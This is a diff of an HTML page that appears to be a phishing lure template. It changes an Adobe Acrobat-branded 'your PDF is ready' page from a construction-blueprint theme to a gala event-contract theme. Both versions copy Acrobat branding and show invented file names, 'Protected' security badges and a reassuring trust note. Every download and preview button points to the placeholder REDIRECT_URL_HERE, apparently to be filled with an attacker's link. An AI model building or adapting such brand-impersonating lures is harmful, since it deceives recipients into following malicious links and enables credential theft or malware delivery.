@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acrobat Blueprint Review</title>
+    <title>Acrobat Event Contract Suite</title>
     <style>
         @page {
             size: A4;
@@ -17,98 +17,89 @@
         }
 
         :root {
-            --blueprint: #102b52;
-            --blueprint-deep: #07162d;
-            --cyan: #48d7ff;
-            --cyan-soft: rgba(72, 215, 255, 0.14);
-            --paper: #f7fbff;
-            --ink: #142033;
-            --muted: #6f7f91;
-            --line: #d8e6f2;
+            --ink: #201915;
+            --muted: #7b6f66;
+            --cream: #fff8ef;
+            --paper: #ffffff;
+            --champagne: #ead5b5;
+            --champagne-deep: #b98b55;
+            --cocoa: #35251c;
+            --rose: #c86c5d;
             --red: #eb1000;
-            --green: #18a970;
-            --amber: #f3ad3d;
-            --shadow: rgba(7, 22, 45, 0.24);
+            --green: #22775a;
+            --line: rgba(99, 71, 47, 0.15);
+            --shadow: rgba(63, 42, 24, 0.18);
         }
 
         html,
         body {
             width: 100%;
-            height: 100%;
-            overflow: hidden;
+            min-height: 100%;
         }
 
         body {
             min-height: 100vh;
-            padding: 18px;
+            padding: 22px;
+            display: grid;
+            place-items: center;
             font-family: "Adobe Clean", Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             color: var(--ink);
             background:
-                radial-gradient(circle at 16% 18%, rgba(72, 215, 255, 0.18), transparent 30%),
-                radial-gradient(circle at 86% 14%, rgba(235, 16, 0, 0.11), transparent 24%),
-                linear-gradient(135deg, #edf6ff 0%, #e6edf6 45%, #dce7f2 100%);
+                radial-gradient(circle at 16% 16%, rgba(200, 108, 93, 0.2), transparent 27%),
+                radial-gradient(circle at 84% 10%, rgba(234, 213, 181, 0.42), transparent 30%),
+                linear-gradient(135deg, #fffaf4 0%, #f3e7d9 48%, #ead8c2 100%);
         }
 
-        .page-shell {
+        .suite {
             width: min(1060px, 100%);
-            height: calc(100vh - 36px);
-            margin: 0 auto;
+            min-height: min(650px, calc(100vh - 44px));
             display: grid;
-            place-items: center;
-        }
-
-        .review-board {
-            width: 100%;
-            max-height: 100%;
-            display: grid;
-            grid-template-columns: minmax(330px, 1.05fr) minmax(360px, 0.95fr);
+            grid-template-columns: minmax(340px, 0.92fr) minmax(380px, 1.08fr);
             overflow: hidden;
-            border: 1px solid rgba(216, 230, 242, 0.95);
-            border-radius: 32px;
-            background: rgba(247, 251, 255, 0.96);
-            box-shadow: 0 28px 82px var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.72);
+            border-radius: 38px;
+            background: rgba(255, 248, 239, 0.9);
+            box-shadow: 0 34px 90px var(--shadow);
         }
 
-        .plan-panel {
+        .visual-panel {
             position: relative;
-            min-height: min(620px, calc(100vh - 36px));
             padding: 34px;
             color: #fff;
             background:
-                linear-gradient(rgba(72, 215, 255, 0.08) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(72, 215, 255, 0.08) 1px, transparent 1px),
-                linear-gradient(145deg, var(--blueprint), var(--blueprint-deep));
-            background-size: 34px 34px, 34px 34px, auto;
+                linear-gradient(145deg, rgba(53, 37, 28, 0.97), rgba(101, 70, 48, 0.92)),
+                var(--cocoa);
             overflow: hidden;
         }
 
-        .plan-panel::before,
-        .plan-panel::after {
+        .visual-panel::before,
+        .visual-panel::after {
             content: "";
             position: absolute;
-            border-radius: 50%;
             pointer-events: none;
         }
 
-        .plan-panel::before {
-            width: 280px;
-            height: 280px;
-            right: -104px;
-            top: -92px;
-            border: 46px solid rgba(72, 215, 255, 0.12);
+        .visual-panel::before {
+            width: 320px;
+            height: 320px;
+            right: -128px;
+            top: -112px;
+            border-radius: 50%;
+            background: rgba(234, 213, 181, 0.16);
         }
 
-        .plan-panel::after {
-            width: 190px;
-            height: 190px;
-            left: -70px;
-            bottom: -68px;
-            background: rgba(235, 16, 0, 0.16);
+        .visual-panel::after {
+            width: 220px;
+            height: 220px;
+            left: -80px;
+            bottom: -86px;
+            border: 42px solid rgba(200, 108, 93, 0.2);
+            border-radius: 50%;
         }
 
         .brand-row,
-        .sheet-preview,
-        .revision-strip {
+        .folio,
+        .venue-stats {
             position: relative;
             z-index: 1;
         }
@@ -121,7 +112,7 @@
         }
 
         .brand-lockup {
-            display: flex;
+            display: inline-flex;
             align-items: center;
             gap: 12px;
             font-weight: 900;
@@ -133,9 +124,9 @@
             height: 44px;
             display: grid;
             place-items: center;
-            border-radius: 15px;
-            background: #fff;
-            box-shadow: 0 16px 34px rgba(0, 0, 0, 0.25);
+            border-radius: 16px;
+            background: var(--red);
+            box-shadow: 0 16px 34px rgba(235, 16, 0, 0.28);
         }
 
         .brand-mark svg {
@@ -143,187 +134,163 @@
             height: 22px;
         }
 
-        .review-tag {
+        .status-pill {
             padding: 8px 12px;
             border: 1px solid rgba(255, 255, 255, 0.22);
             border-radius: 999px;
-            color: rgba(255, 255, 255, 0.86);
+            color: rgba(255, 255, 255, 0.82);
             font-size: 11px;
             font-weight: 900;
-            letter-spacing: 0.12em;
+            letter-spacing: 0.13em;
             text-transform: uppercase;
         }
 
-        .sheet-preview {
-            margin-top: 46px;
-            padding: 22px;
-            border: 1px solid rgba(72, 215, 255, 0.34);
-            border-radius: 28px;
+        .folio {
+            margin-top: 52px;
+            padding: 24px;
+            border: 1px solid rgba(234, 213, 181, 0.26);
+            border-radius: 30px;
             background: rgba(255, 255, 255, 0.08);
-            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.04), 0 24px 52px rgba(0, 0, 0, 0.24);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.12), 0 24px 56px rgba(0, 0, 0, 0.22);
         }
 
-        .sheet-toolbar {
+        .folio-top {
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 18px;
-            color: rgba(255, 255, 255, 0.72);
+            gap: 18px;
+            margin-bottom: 22px;
+        }
+
+        .folio-kicker {
+            color: rgba(255, 255, 255, 0.58);
+            font-size: 11px;
+            font-weight: 900;
+            letter-spacing: 0.13em;
+            text-transform: uppercase;
+        }
+
+        .folio-title {
+            margin-top: 6px;
+            font-size: 28px;
+            line-height: 1;
+            font-weight: 900;
+            letter-spacing: -0.05em;
+        }
+
+        .pdf-badge {
+            width: 66px;
+            height: 78px;
+            display: grid;
+            place-items: end center;
+            padding-bottom: 12px;
+            flex: 0 0 auto;
+            border-radius: 18px;
+            color: #fff;
+            background:
+                linear-gradient(135deg, transparent 0 28%, rgba(255, 255, 255, 0.24) 28% 43%, transparent 43%),
+                var(--red);
+            font-size: 14px;
+            font-weight: 900;
+            letter-spacing: 0.06em;
+            box-shadow: 0 18px 34px rgba(0, 0, 0, 0.22);
+        }
+
+        .divider {
+            height: 1px;
+            margin: 18px 0;
+            background: linear-gradient(90deg, transparent, rgba(234, 213, 181, 0.55), transparent);
+        }
+
+        .venue-card {
+            padding: 18px;
+            border-radius: 24px;
+            background:
+                linear-gradient(135deg, rgba(255, 255, 255, 0.18), rgba(255, 255, 255, 0.08));
+            border: 1px solid rgba(255, 255, 255, 0.14);
+        }
+
+        .venue-card h2 {
+            font-size: 18px;
+            letter-spacing: -0.03em;
+        }
+
+        .venue-card p {
+            margin-top: 8px;
+            color: rgba(255, 255, 255, 0.64);
+            font-size: 13px;
+            line-height: 1.55;
+        }
+
+        .signature-line {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            align-items: end;
+            gap: 14px;
+            margin-top: 18px;
+            color: rgba(255, 255, 255, 0.78);
             font-size: 12px;
             font-weight: 800;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
         }
 
-        .sheet-status {
-            color: var(--cyan);
+        .signature-line span:first-child {
+            border-bottom: 1px solid rgba(234, 213, 181, 0.54);
+            padding-bottom: 8px;
         }
 
-        .blueprint-sheet {
-            position: relative;
-            min-height: 286px;
-            padding: 18px;
-            border-radius: 20px;
-            overflow: hidden;
-            background:
-                linear-gradient(rgba(72, 215, 255, 0.16) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(72, 215, 255, 0.16) 1px, transparent 1px),
-                rgba(7, 22, 45, 0.74);
-            background-size: 26px 26px;
-            border: 1px solid rgba(72, 215, 255, 0.28);
-        }
-
-        .blueprint-sheet span {
-            position: absolute;
-            display: block;
-            border-color: rgba(255, 255, 255, 0.76);
-        }
-
-        .wall-a {
-            left: 42px;
-            top: 54px;
-            width: 212px;
-            height: 132px;
-            border: 3px solid;
-        }
-
-        .wall-b {
-            left: 82px;
-            top: 88px;
-            width: 72px;
-            height: 98px;
-            border: 2px solid;
-            border-top: 0;
-        }
-
-        .wall-c {
-            left: 154px;
-            top: 88px;
-            width: 100px;
-            height: 52px;
-            border-left: 2px solid;
-            border-bottom: 2px solid;
-        }
-
-        .door-arc {
-            left: 68px;
-            top: 144px;
-            width: 44px;
-            height: 44px;
-            border: 2px solid rgba(72, 215, 255, 0.82);
-            border-left: 0;
-            border-bottom: 0;
-            border-radius: 0 44px 0 0;
-        }
-
-        .measure-x {
-            left: 42px;
-            top: 212px;
-            width: 212px;
-            height: 1px;
-            border-top: 1px dashed rgba(72, 215, 255, 0.72);
-        }
-
-        .measure-y {
-            left: 278px;
-            top: 54px;
-            width: 1px;
-            height: 132px;
-            border-left: 1px dashed rgba(72, 215, 255, 0.72);
-        }
-
-        .sheet-label {
-            position: absolute;
-            right: 18px;
-            bottom: 18px;
-            display: grid;
-            gap: 4px;
-            width: 128px;
-            padding: 10px;
-            border: 1px solid rgba(255, 255, 255, 0.42);
-            color: #fff;
-            font-size: 10px;
-            font-weight: 800;
-            letter-spacing: 0.05em;
-            text-transform: uppercase;
-        }
-
-        .sheet-label strong {
-            color: var(--cyan);
-            font-size: 16px;
-            letter-spacing: 0;
-            text-transform: none;
-        }
-
-        .revision-strip {
+        .venue-stats {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 18px;
         }
 
-        .revision-item {
+        .venue-stat {
             padding: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.16);
-            border-radius: 16px;
+            border-radius: 18px;
             background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.12);
         }
 
-        .revision-item span {
+        .venue-stat span {
             display: block;
-            color: rgba(255, 255, 255, 0.56);
+            color: rgba(255, 255, 255, 0.52);
             font-size: 10px;
             font-weight: 900;
             letter-spacing: 0.12em;
             text-transform: uppercase;
         }
 
-        .revision-item strong {
+        .venue-stat strong {
             display: block;
-            margin-top: 4px;
+            margin-top: 5px;
             color: #fff;
-            font-size: 15px;
+            font-size: 14px;
         }
 
         .content-panel {
-            padding: 38px 36px;
+            padding: 42px 40px;
             display: flex;
             flex-direction: column;
             justify-content: center;
+            background:
+                linear-gradient(90deg, rgba(255, 255, 255, 0.7), rgba(255, 255, 255, 0.42)),
+                var(--cream);
         }
 
         .eyebrow {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 9px;
             width: fit-content;
-            padding: 8px 12px;
+            padding: 8px 13px;
+            border: 1px solid rgba(185, 139, 85, 0.2);
             border-radius: 999px;
-            background: var(--cyan-soft);
-            color: #087ea4;
+            color: #8a5c28;
+            background: rgba(234, 213, 181, 0.34);
             font-size: 11px;
             font-weight: 900;
-            letter-spacing: 0.12em;
+            letter-spacing: 0.13em;
             text-transform: uppercase;
         }
 
@@ -333,93 +300,98 @@
             height: 8px;
             border-radius: 50%;
             background: var(--green);
-            box-shadow: 0 0 0 5px rgba(24, 169, 112, 0.13);
+            box-shadow: 0 0 0 5px rgba(34, 119, 90, 0.12);
         }
 
         h1 {
-            margin-top: 20px;
-            max-width: 420px;
-            font-size: clamp(32px, 4vw, 48px);
-            line-height: 0.98;
-            letter-spacing: -0.06em;
+            max-width: 520px;
+            margin-top: 22px;
+            font-size: clamp(34px, 4.8vw, 56px);
+            line-height: 0.96;
+            letter-spacing: -0.07em;
             color: var(--ink);
         }
 
         .lede {
-            max-width: 430px;
-            margin-top: 16px;
+            max-width: 500px;
+            margin-top: 18px;
             color: var(--muted);
             font-size: 15px;
-            line-height: 1.65;
+            line-height: 1.72;
         }
 
-        .file-card {
+        .document-card {
             display: grid;
             grid-template-columns: auto 1fr auto;
             align-items: center;
             gap: 14px;
-            margin-top: 26px;
+            margin-top: 28px;
             padding: 16px;
             border: 1px solid var(--line);
-            border-radius: 22px;
-            background: #fff;
-            box-shadow: 0 16px 34px rgba(16, 43, 82, 0.08);
+            border-radius: 24px;
+            background: rgba(255, 255, 255, 0.78);
+            box-shadow: 0 18px 38px rgba(80, 51, 27, 0.08);
         }
 
-        .pdf-tile {
+        .mini-pdf {
             width: 48px;
             height: 58px;
             display: grid;
             place-items: end center;
             padding-bottom: 9px;
-            border-radius: 12px;
+            border-radius: 13px;
             color: #fff;
             background:
-                linear-gradient(135deg, transparent 0 22%, rgba(255, 255, 255, 0.24) 22% 36%, transparent 36%),
+                linear-gradient(135deg, transparent 0 26%, rgba(255, 255, 255, 0.24) 26% 42%, transparent 42%),
                 var(--red);
             font-size: 12px;
             font-weight: 900;
-            letter-spacing: 0.04em;
+            letter-spacing: 0.05em;
         }
 
         .file-name {
+            color: var(--ink);
             font-size: 15px;
             font-weight: 900;
-            color: var(--ink);
         }
 
         .file-meta {
-            margin-top: 4px;
+            margin-top: 5px;
             color: var(--muted);
             font-size: 12px;
         }
 
-        .phase-chip {
-            padding: 8px 10px;
-            border-radius: 12px;
-            background: #fff7e8;
-            color: #9a6208;
-            font-size: 11px;
+        .seal {
+            display: grid;
+            place-items: center;
+            min-width: 58px;
+            height: 58px;
+            border-radius: 50%;
+            color: #7a4e1c;
+            border: 1px solid rgba(185, 139, 85, 0.3);
+            background: #fff4df;
+            font-size: 10px;
             font-weight: 900;
-            text-transform: uppercase;
             letter-spacing: 0.08em;
+            text-transform: uppercase;
+            text-align: center;
         }
 
-        .detail-grid {
+        .info-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 18px;
         }
 
-        .detail-card {
+        .info-box {
             padding: 14px;
             border: 1px solid var(--line);
-            border-radius: 18px;
-            background: rgba(255, 255, 255, 0.72);
+            border-radius: 19px;
+            background: rgba(255, 255, 255, 0.54);
         }
 
-        .detail-card span {
+        .info-box span {
             display: block;
             color: var(--muted);
             font-size: 10px;
@@ -428,81 +400,78 @@
             text-transform: uppercase;
         }
 
-        .detail-card strong {
+        .info-box strong {
             display: block;
-            margin-top: 6px;
-            font-size: 14px;
+            margin-top: 7px;
             color: var(--ink);
+            font-size: 14px;
         }
 
         .actions {
             display: grid;
-            gap: 10px;
-            margin-top: 24px;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 26px;
         }
 
         .action-link {
-            display: flex;
+            min-height: 52px;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            min-height: 50px;
             border-radius: 999px;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 900;
             text-decoration: none;
             transition: transform 0.2s ease, box-shadow 0.2s ease;
         }
 
         .action-link:hover {
-            transform: translateY(-1px);
+            transform: translateY(-2px);
         }
 
         .action-link svg {
-            width: 19px;
-            height: 19px;
+            width: 18px;
+            height: 18px;
         }
 
         .primary {
             color: #fff;
-            background: linear-gradient(135deg, #1473e6, #0d55b7);
-            box-shadow: 0 16px 34px rgba(20, 115, 230, 0.28);
+            background: linear-gradient(135deg, #eb1000, #b22d21);
+            box-shadow: 0 16px 34px rgba(235, 16, 0, 0.22);
         }
 
         .secondary {
-            color: #103d67;
-            border: 1px solid var(--line);
+            color: #6f4420;
+            border: 1px solid rgba(185, 139, 85, 0.28);
             background: #fff;
         }
 
-        .review-note {
+        .trust-note {
             margin-top: 16px;
             padding: 14px 16px;
-            border-left: 4px solid var(--amber);
-            border-radius: 14px;
-            color: #6b557c;
-            background: #fff8e9;
+            border-radius: 18px;
+            color: #746155;
+            background: rgba(255, 255, 255, 0.54);
+            border: 1px solid var(--line);
             font-size: 12px;
-            line-height: 1.55;
+            line-height: 1.58;
         }
 
         @media (max-width: 820px) {
-            html,
             body {
-                height: auto;
-                overflow: auto;
+                padding: 14px;
             }
 
-            .page-shell {
-                height: auto;
-            }
-
-            .review-board {
+            .suite {
                 grid-template-columns: 1fr;
             }
 
-            .plan-panel {
-                min-height: 560px;
+            .actions,
+            .info-grid,
+            .venue-stats {
+                grid-template-columns: 1fr;
             }
         }
 
@@ -511,16 +480,15 @@
                 background: #fff;
             }
 
-            .review-board,
-            .file-card {
+            .suite,
+            .document-card {
                 box-shadow: none;
             }
 
-            .plan-panel,
+            .visual-panel,
             .primary,
-            .phase-chip,
-            .eyebrow,
-            .review-note {
+            .seal,
+            .eyebrow {
                 -webkit-print-color-adjust: exact;
                 print-color-adjust: exact;
             }
@@ -528,109 +496,107 @@
     </style>
 </head>
 <body>
-    <main class="page-shell" aria-labelledby="page-title">
-        <section class="review-board">
-            <aside class="plan-panel">
-                <div class="brand-row">
-                    <div class="brand-lockup">
-                        <div class="brand-mark" aria-hidden="true">
-                            <svg viewBox="0 0 30 26" fill="none">
-                                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
-                                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
-                                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
-                            </svg>
-                        </div>
-                        <span>Acrobat Blueprint Desk</span>
+    <main class="suite" aria-labelledby="page-title">
+        <aside class="visual-panel">
+            <div class="brand-row">
+                <div class="brand-lockup">
+                    <div class="brand-mark" aria-hidden="true">
+                        <svg viewBox="0 0 30 26" fill="none">
+                            <path d="M11.5 0H0V26L11.5 0Z" fill="#fff"/>
+                            <path d="M18.5 0H30V26L18.5 0Z" fill="#fff"/>
+                            <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#fff"/>
+                        </svg>
                     </div>
-                    <span class="review-tag">AEC Review</span>
+                    <span>Acrobat Signature Suite</span>
                 </div>
+                <span class="status-pill">Ready</span>
+            </div>
 
-                <div class="sheet-preview" aria-hidden="true">
-                    <div class="sheet-toolbar">
-                        <span>Sheet A-204</span>
-                        <span class="sheet-status">Issued</span>
-                    </div>
-                    <div class="blueprint-sheet">
-                        <span class="wall-a"></span>
-                        <span class="wall-b"></span>
-                        <span class="wall-c"></span>
-                        <span class="door-arc"></span>
-                        <span class="measure-x"></span>
-                        <span class="measure-y"></span>
-                        <div class="sheet-label">
-                            <span>Level 04</span>
-                            <strong>PDF</strong>
-                            <span>Revision 08</span>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="revision-strip" aria-label="Revision summary">
-                    <div class="revision-item">
-                        <span>Markup</span>
-                        <strong>12 notes</strong>
-                    </div>
-                    <div class="revision-item">
-                        <span>Trade</span>
-                        <strong>MEP</strong>
-                    </div>
-                    <div class="revision-item">
-                        <span>Status</span>
-                        <strong>Ready</strong>
-                    </div>
-                </div>
-            </aside>
-
-            <section class="content-panel">
-                <div class="eyebrow">Construction document package</div>
-                <h1 id="page-title">Blueprint PDF ready for field review.</h1>
-                <p class="lede">The latest architectural sheet set has been packaged as a secure Acrobat PDF so project teams can download, open, or route a copy for coordination.</p>
-
-                <div class="file-card">
-                    <div class="pdf-tile" aria-hidden="true">PDF</div>
+            <div class="folio" aria-hidden="true">
+                <div class="folio-top">
                     <div>
-                        <div class="file-name">North_Tower_Field_Set_R08.pdf</div>
-                        <div class="file-meta">PDF document · 18.4 MB · 42 sheets · Updated May 3, 2026</div>
+                        <div class="folio-kicker">Hospitality agreement</div>
+                        <div class="folio-title">Gala Event Contract</div>
                     </div>
-                    <div class="phase-chip">IFC</div>
+                    <div class="pdf-badge">PDF</div>
                 </div>
-
-                <div class="detail-grid" aria-label="PDF package details">
-                    <div class="detail-card">
-                        <span>Discipline</span>
-                        <strong>Architecture</strong>
-                    </div>
-                    <div class="detail-card">
-                        <span>Revision</span>
-                        <strong>R08</strong>
-                    </div>
-                    <div class="detail-card">
-                        <span>Access</span>
-                        <strong>Encrypted</strong>
+                <div class="divider"></div>
+                <div class="venue-card">
+                    <h2>The Meridian Ballroom</h2>
+                    <p>Final banquet order, venue terms, payment milestones, and production schedule prepared for guest services review.</p>
+                    <div class="signature-line">
+                        <span>Client approval signature</span>
+                        <strong>May 03</strong>
                     </div>
                 </div>
+            </div>
 
-                <div class="actions" aria-label="Blueprint PDF actions">
-                    <a class="action-link primary" href="REDIRECT_URL_HERE">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                            <path d="M7 10l5 5 5-5"/>
-                            <path d="M12 15V3"/>
-                        </svg>
-                        Download blueprint PDF
-                    </a>
-                    <a class="action-link secondary" href="REDIRECT_URL_HERE" target="_blank" rel="noopener">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
-                            <path d="M14 2v6h6"/>
-                            <path d="M9 15h6"/>
-                        </svg>
-                        Open sheet preview
-                    </a>
+            <div class="venue-stats" aria-label="Contract summary">
+                <div class="venue-stat">
+                    <span>Guests</span>
+                    <strong>240</strong>
                 </div>
+                <div class="venue-stat">
+                    <span>Package</span>
+                    <strong>Premium</strong>
+                </div>
+                <div class="venue-stat">
+                    <span>Pages</span>
+                    <strong>16</strong>
+                </div>
+            </div>
+        </aside>
 
-                <p class="review-note">Direct PDF action links are embedded for reliable access from supported exported documents and project review packets.</p>
-            </section>
+        <section class="content-panel">
+            <div class="eyebrow">Event services packet</div>
+            <h1 id="page-title">Your hospitality contract is ready to review.</h1>
+            <p class="lede">Open the finalized Acrobat PDF package for event terms, catering selections, floor plan notes, and signature-ready approval details.</p>
+
+            <div class="document-card">
+                <div class="mini-pdf" aria-hidden="true">PDF</div>
+                <div>
+                    <div class="file-name">Meridian_Gala_Service_Agreement.pdf</div>
+                    <div class="file-meta">PDF document · 5.8 MB · Updated May 3, 2026</div>
+                </div>
+                <div class="seal">Final<br>Copy</div>
+            </div>
+
+            <div class="info-grid" aria-label="PDF details">
+                <div class="info-box">
+                    <span>Department</span>
+                    <strong>Events</strong>
+                </div>
+                <div class="info-box">
+                    <span>Version</span>
+                    <strong>Signed Draft</strong>
+                </div>
+                <div class="info-box">
+                    <span>Security</span>
+                    <strong>Protected</strong>
+                </div>
+            </div>
+
+            <div class="actions" aria-label="PDF actions">
+                <a class="action-link primary" href="REDIRECT_URL_HERE">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                        <path d="M7 10l5 5 5-5"/>
+                        <path d="M12 15V3"/>
+                    </svg>
+                    Download PDF
+                </a>
+                <a class="action-link secondary" href="REDIRECT_URL_HERE" target="_blank" rel="noopener">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                        <path d="M14 2v6h6"/>
+                        <path d="M8 13h8"/>
+                        <path d="M8 17h5"/>
+                    </svg>
+                    Open Preview
+                </a>
+            </div>
+
+            <p class="trust-note">This PDF package is prepared for secure Acrobat access and keeps the document action links available from exported or embedded views.</p>
         </section>
     </main>
 </body>
